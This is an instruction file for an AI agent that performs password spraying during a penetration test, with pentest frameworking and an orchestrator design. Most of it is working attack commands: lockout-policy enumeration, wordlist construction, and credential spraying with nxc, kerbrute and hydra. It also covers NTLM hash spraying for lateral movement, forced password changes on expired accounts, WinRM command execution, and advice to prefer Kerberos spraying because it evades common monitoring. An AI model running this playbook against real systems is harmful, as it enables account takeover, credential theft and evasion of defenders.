---
name: password-spraying
description: >
  Performs password spraying against authentication services with lockout-safe
  techniques. Works against AD (SMB/Kerberos/LDAP), SSH, web login forms, OWA,
  and any service with username/password auth. Service-agnostic — the
  orchestrator passes target services and spray intensity tier.
keywords:
  - password spray
  - spray passwords
  - domain spray
  - brute force domain
  - find valid credentials
  - lockout policy
  - kerbrute spray
  - credential guessing
  - smb spray
  - winrm spray
  - ssh spray
  - mssql spray
  - mysql spray
  - web login spray
  - hydra
  - nxc spray
tools:
  - kerbrute
  - netexec
  - hydra
  - SpearSpray
  - DomainPasswordSpray
  - spray.sh
opsec: high
---

# Password Spraying

You are helping a penetration tester perform password spraying against
authentication services. All testing is under explicit written authorization.

**OPSEC Exception**: This skill tests credentials directly against the domain.
The Kerberos-first authentication convention does not apply here — spraying IS
the authentication attempt. However, Kerberos pre-auth spraying (kerbrute,
SpearSpray) is preferred over NTLM spraying because it generates Event 4771
instead of 4625, which is less commonly monitored.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[password-spraying] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

Do NOT write to `engagement/activity.md`, `engagement/findings.md`, or
engagement state. The orchestrator maintains these files. Report all findings
in your return summary.

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

**Do NOT write engagement state.** When your work is complete, report all
findings clearly in your return summary. The orchestrator parses your summary
and records state changes. Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Username list (from RID cycling, kerbrute, LDAP, or BloodHound)
- Network access to DC (port 88 for Kerberos, 445 for SMB, 389 for LDAP)
- Tools: `kerbrute`, `netexec` (nxc), optionally `SpearSpray`,
  `DomainPasswordSpray`, `spray.sh`

**WARNING**: Always enumerate password policy before spraying. Spraying without
knowing the lockout threshold risks locking out accounts.

## Step 1: Enumerate Password Policy

### From Linux (Unauthenticated)

**Primary — LDAP anonymous query** (most reliable, returns structured data):

```bash
# Query lockout + password attributes from domain root object
ldapsearch -x -H ldap://DC01.DOMAIN.LOCAL -b "DC=DOMAIN,DC=LOCAL" -s base \
  '(objectClass=*)' lockoutThreshold lockOutObservationWindow \
  lockoutDuration minPwdLength pwdProperties
```

Returns integer values directly:
- `lockoutThreshold: 0` = no lockout (spray freely)
- `lockoutThreshold: 5` = 5 attempts before lockout
- Duration/window values are negative 100ns intervals — divide abs(value) by
  600,000,000 to get minutes (e.g., `-18000000000` = 30 minutes)

Requires anonymous LDAP bind (common on misconfigured DCs).

**Secondary — NetExec SAMR query** (human-readable output):

```bash
nxc smb DC01.DOMAIN.LOCAL -u '' -p '' --pass-pol
nxc smb DC01.DOMAIN.LOCAL -u 'guest' -p '' --pass-pol
```

Look for "Account Lockout Threshold" in the output. "None" = 0 = no lockout.

**Tertiary — enum4linux-ng** (modern Python rewrite of enum4linux):

```bash
enum4linux-ng -P DC01.DOMAIN.LOCAL
```

**Note on rpcclient:** `rpcclient -c "getdompwinfo"` returns min password
length and password properties only — it does NOT return lockout threshold,
observation window, or lockout duration. Do not rely on it for lockout policy.

### From Linux (Authenticated)

```bash
# NetExec with valid creds
nxc smb DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' --pass-pol

# With Kerberos
nxc smb DC01.DOMAIN.LOCAL --use-kcache --pass-pol
```

### From Windows

```powershell
# Built-in
net accounts /domain

# PowerView
(Get-DomainPolicy)."SystemAccess"
```

### Key Values to Record

| Policy Setting | What to Record |
|---------------|----------------|
| Lockout threshold | Max failed attempts before lockout (0 = no lockout) |
| Observation window | Time window for counting failures (minutes) |
| Lockout duration | How long accounts stay locked (minutes) |
| Min password length | Informs password list generation |
| Complexity requirements | Whether special chars/numbers are required |
| Password history | Number of previous passwords remembered |

**Critical**: If lockout threshold is 0, there is no lockout — spray freely.
If threshold is low (1-3), extreme caution is needed.

### Fine-Grained Password Policies (PSOs)

Different groups may have different lockout thresholds. SpearSpray handles
this automatically. To check manually:

```bash
# bloodyAD
bloodyAD -u user -p 'Password123' -d DOMAIN.LOCAL --host DC_IP \
  get search --filter '(objectClass=msDS-PasswordSettings)' \
  --attr cn,msDS-LockoutThreshold,msDS-LockoutObservationWindow

# PowerView
Get-DomainFineGrainedPasswordPolicy
```

## Step 2: Verify Usernames

The orchestrator passes usernames in the agent prompt. Write them to
`engagement/evidence/usernames.txt` as described in the File-Based Spray
Model section above.

If the orchestrator did NOT provide usernames and you need to enumerate:

```bash
# RID cycling (unauthenticated)
nxc smb DC01.DOMAIN.LOCAL -u 'guest' -p '' --rid-brute 10000 \
  | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > engagement/evidence/usernames.txt

# kerbrute user enumeration (Kerberos — stealthier, generates 4771)
kerbrute userenum -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

## File-Based Spray Model

**All spraying uses wordlist files. Never pass passwords inline to tools.**

The agent creates files in `engagement/evidence/` before spraying. This
ensures reproducibility, prevents shell escaping bugs, and lets the operator
review what will be tested.

### Files to Create

| File | Contents | When |
|------|----------|------|
| `engagement/evidence/usernames.txt` | One username per line | Always, from orchestrator-provided list |
| `engagement/evidence/wordlist.txt` | Agent-generated context passwords (domain/hostname/season — NOT usernames) | Always, before first spray round |
| (SecLists path) | External wordlist, referenced by path | All tiers (size varies by tier) |

### wordlist.txt — Agent-Generated Context Passwords

Build `wordlist.txt` from known engagement context. These are the ONLY
passwords the agent may generate. **Do NOT invent, guess, or improvise
passwords beyond these patterns.**

**Do NOT include usernames in wordlist.txt.** Username-as-password is handled
in Round 1 by passing `usernames.txt` as both the user and password file.
Adding usernames to wordlist.txt would redundantly re-test them in Round 2.

**Patterns to include (substitute real values from context):**

```bash
cat > engagement/evidence/wordlist.txt << 'WORDLIST'
# === Domain/hostname/company name derivatives ===
{DomainName}1!
{domainname}1!
{DomainName}123
{domainname}123
{Hostname}1!
{hostname}1!
{Hostname}123
{hostname}123

# === Season + year (current + previous, generate dynamically) ===
Winter2026!
Spring2026!
Autumn2025!
Summer2025!
Winter2025!
Spring2025!
WORDLIST
```

Replace `{DomainName}` and `{Hostname}` with actual values (e.g., `Megabank`,
`Monteverde`). Use both the short name and FQDN where they differ.

**That is the complete list.** Do not add `Password1`, `Welcome1`, or other
generic passwords — those come from the SecLists file. Do not add creative
guesses like `azure_123!` or `Demo123!`. The purpose of `wordlist.txt` is
context-specific passwords that no generic wordlist would contain.

### usernames.txt

Write the usernames from the orchestrator prompt, one per line:

```bash
cat > engagement/evidence/usernames.txt << 'USERS'
<usernames from orchestrator prompt, one per line>
USERS
```

## Spray Intensity Tiers

The orchestrator passes a spray intensity tier and target services in the
agent prompt. Check for them and build the spray plan accordingly. If no tier
is specified, default to **light**.

**Every tier sprays the same wordlist.txt. Tiers differ only in which
SecLists file is appended.**

### Light Spray

1. Username-as-password round (special handling — see Spray Execution below)
2. `engagement/evidence/wordlist.txt` (agent-generated context passwords)
3. `/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt` (~500 passwords)

### Medium Spray

1. Username-as-password round
2. `engagement/evidence/wordlist.txt`
3. `/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt` (~10k passwords)

### Heavy Spray

1. Username-as-password round
2. `engagement/evidence/wordlist.txt`
3. `/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt` (~100k passwords)

### Custom Wordlist

1. Username-as-password round
2. `engagement/evidence/wordlist.txt`
3. Operator-provided wordlist path

## Spray Execution

**Sequential. One service at a time. One spray round at a time.**

The orchestrator specifies which services to spray (from the operator's
selection). Spray each service in the order listed. Complete ALL rounds on
one service before moving to the next.

**Do NOT:**
- Run multiple spray commands in parallel or as background tasks
- Spray the same password list on multiple services simultaneously
- Skip ahead to SecLists before completing wordlist.txt
- Invent passwords not in the wordlist files

### Round 1: Username-as-Password (per service)

Use the usernames file as both the user list and the password list:

```bash
nxc smb TARGET -u engagement/evidence/usernames.txt \
  -p engagement/evidence/usernames.txt \
  --continue-on-success -d DOMAIN
```

This tests every username as a password against every user (N×N attempts).
For typical user lists (<20 users), this is well within safe lockout bounds
and catches cases where users set another user's name as their password.

**If any hit is found:** Record it, note which user/password, and continue
spraying remaining rounds (other users may also have weak passwords).

### Round 2: wordlist.txt (per service)

Standard spray — every password tested against all users:

```bash
nxc smb TARGET -u engagement/evidence/usernames.txt \
  -p engagement/evidence/wordlist.txt \
  --continue-on-success -d DOMAIN
```

### Round 3: SecLists Wordlist (per service, tier-dependent)

Same approach, pointing to the tier-appropriate SecLists file:

```bash
# Light tier
nxc smb TARGET -u engagement/evidence/usernames.txt \
  -p /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt \
  --continue-on-success -d DOMAIN

# Medium tier
nxc smb TARGET -u engagement/evidence/usernames.txt \
  -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  --continue-on-success -d DOMAIN

# Heavy tier
nxc smb TARGET -u engagement/evidence/usernames.txt \
  -p /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt \
  --continue-on-success -d DOMAIN
```

### Service Protocol Commands

Use `nxc` (netexec) for all supported protocols. Only fall back to `hydra`
for protocols netexec does not support.

```bash
# SMB (most common)
nxc smb TARGET -u USERFILE -p PASSFILE --continue-on-success -d DOMAIN

# LDAP
nxc ldap TARGET -u USERFILE -p PASSFILE --continue-on-success

# WinRM (if 5985/5986 open)
nxc winrm TARGET -u USERFILE -p PASSFILE --continue-on-success

# RDP
nxc rdp TARGET -u USERFILE -p PASSFILE --continue-on-success

# MSSQL
nxc mssql TARGET -u USERFILE -p PASSFILE --continue-on-success

# SSH
nxc ssh TARGET -u USERFILE -p PASSFILE --continue-on-success

# FTP (hydra — nxc does not support FTP)
hydra -L USERFILE -P PASSFILE ftp://TARGET -u -t 4 -o spray-ftp.log

# HTTP POST form (hydra — adjust form params and failure string)
hydra -L USERFILE -P PASSFILE TARGET http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials" \
  -u -t 4 -o spray-web.log
```

**Critical flags:**
- `--continue-on-success` — don't stop at first valid credential.
- `-d DOMAIN` — for domain-joined services (SMB, WinRM). Omit for local auth.

**Do NOT use `--no-bruteforce`** for spray rounds. Despite its name,
`--no-bruteforce` does line-by-line matching (user1:pass1, user2:pass2) — if
the password file is longer than the user file, extra passwords are silently
skipped. Without it, nxc tests all combinations (every password against every
user), which is what spray mode requires. Use lockout-aware pacing (below)
to stay safe.

## Lockout-Aware Spray Pacing

If the lockout policy has a non-zero threshold, pace the spray to avoid
lockouts:

```
safe_attempts = lockout_threshold - 2  # leave buffer
wait_time = observation_window + 1 minute  # wait for counter reset
```

Example: threshold=5, window=30min → spray 3 passwords per user, wait 31
minutes, resume. The builtin **Administrator (RID 500) cannot be locked out**
regardless of policy — always safe to spray.

If you have authenticated access, check current badPwdCount per user before
spraying to identify accounts already close to lockout:
```bash
nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' --users
```

## OPSEC: Kerberos vs NTLM Spraying

| Protocol | Detection Event | Commonly Monitored? |
|----------|----------------|---------------------|
| Kerberos pre-auth (kerbrute) | 4771 (pre-auth failure) | Less commonly |
| SMB/NTLM (netexec) | 4625 (logon failure) | Yes, standard SIEM rule |
| LDAP (netexec) | 4625 (logon failure) | Yes |

For OPSEC-sensitive engagements where detection matters, use kerbrute for
Kerberos pre-auth spraying instead of netexec SMB/LDAP. For CTF/HTB or
engagements where OPSEC is not a concern, netexec is simpler and preferred.

### kerbrute (Kerberos Pre-Auth)

```bash
kerbrute passwordspray -d DOMAIN.LOCAL --dc DC01.DOMAIN.LOCAL \
  users.txt 'Spring2026!' -v -o spray-round1.log
```

### Hash Spray (Lateral Movement)

When you have a recovered NTLM hash, spray it across targets:
```bash
nxc smb 10.10.10.0/24 -u 'Administrator' \
  -H 'aad3b435b51404eeaad3b435b51404ee:NTHASH' \
  --local-auth | grep "Pwn3d"
```

## Step 3: Validate and Exploit Hits

### Verify Access Level

```bash
# Check SMB access and admin status
nxc smb DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' -d DOMAIN.LOCAL
# (Pwn3d!) = local admin

# Check shares
nxc smb DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' \
  -d DOMAIN.LOCAL --shares

# Verify WinRM access
nxc winrm DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' \
  -d DOMAIN.LOCAL -x "whoami"

# Check RDP access
nxc rdp DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' -d DOMAIN.LOCAL
```

### Empty Password / Must-Change Technique

Spray empty passwords to find accounts with expired/must-change passwords:

```bash
# Spray empty password
nxc smb DC01.DOMAIN.LOCAL -u users.txt -p '' --continue-on-success

# STATUS_PASSWORD_MUST_CHANGE = expired password
# Change it via SAMR (no old password needed for must-change accounts):
NEWPASS='P@ssw0rd!2025#'
nxc smb DC01.DOMAIN.LOCAL -u 'target_user' -p '' \
  -M change-password -o NEWPASS="$NEWPASS"
```

### Get Domain Password Policy (Post-Auth)

```bash
nxc smb DC01.DOMAIN.LOCAL -u 'valid_user' -p 'CrackedPass' \
  -d DOMAIN.LOCAL --pass-pol
```

## Step 4: Escalate or Pivot

After finding valid credentials:
- **Get a TGT immediately** and switch to Kerberos auth for all future actions:
  ```bash
  getTGT.py DOMAIN/valid_user:'CrackedPass'@DC01.DOMAIN.LOCAL
  export KRB5CCNAME=valid_user.ccache
  ```
- **Local admin on targets**: Route to **credential-dumping** (SAM/LSASS dump),
  then **pass-the-hash** for lateral movement
- **Standard domain user**: Route to **ad-discovery** for full
  authenticated enumeration (BloodHound, ADCS, ACLs)
- **Service account with SPN**: Route to **kerberos-roasting** for related
  accounts
- **High-privilege account**: Route to **credential-dumping** (DCSync)

When routing, pass: valid username/password, domain, DC hostname, current mode.

## Stall Detection

If you have spent **5 or more tool-calling rounds** on the same failure with
no meaningful progress — same error, no new information, no change in output
— **stop**.

**What counts as progress:**
- Trying a variant or alternative **documented in this skill**
- Adjusting syntax, flags, or parameters per the Troubleshooting section
- Gaining new diagnostic information (different error, partial success)

**What does NOT count as progress:**
- Writing custom exploit code not provided in this skill
- Inventing workarounds using techniques from other domains
- Retrying the same command with trivially different input
- Compiling or transferring tools not mentioned in this skill

If you find yourself writing code that isn't in this skill, you have left
methodology. That is a stall.

Do not loop. Work through failures systematically:
1. Try each variant or alternative **once**
2. Check the Troubleshooting section for known fixes
3. If nothing works after 5 rounds, you are stalled

**When stalled, return to the orchestrator immediately with:**
- What was attempted (commands, variants, alternatives tried)
- What failed and why (error messages, empty responses, timeouts)
- Assessment: **blocked** (permanent — config, patched, missing prereq) or
  **retry-later** (may work with different context, creds, or access)

**Mode behavior:**
- **Guided**: Tell the user you're stalled, present what was tried, and
  recommend the next best path.
- **Autonomous**: Return findings to the orchestrator. Do not retry the same
  technique — the orchestrator will decide whether to revisit with new context
  or route elsewhere.

## Troubleshooting

### Account Lockouts

- **Immediate response**: Stop all spray operations
- **Check**: Re-query password policy — you may have hit a Fine-Grained
  Password Policy with a lower threshold
- **Recovery**: Lockout duration is typically 30 minutes. Wait and resume
  with fewer attempts per round

### KRB_AP_ERR_SKEW (Clock Skew — kerbrute path only)

Kerberos requires clocks within 5 minutes of the DC. This applies to the
kerbrute-based spraying path, not NTLM-based spraying. This is a **Clock Skew
Interrupt** — stop immediately and return to the orchestrator. Do not retry or
fall back to NTLM. The fix requires root:
```bash
sudo ntpdate DC_IP
# or
sudo rdate -n DC_IP
```

### No Lockout Threshold (0)

If lockout threshold is 0, there is no lockout protection. You can spray
aggressively, but still prefer Kerberos pre-auth for detection avoidance.

### Valid Creds but ACCESS_DENIED

- Account may be disabled, expired, or restricted to specific workstations
- Check `userAccountControl` flags via LDAP
- Try different protocols (SMB may fail but WinRM may work, or vice versa)
- Try local authentication: `nxc smb TARGET -u user -p pass --local-auth`
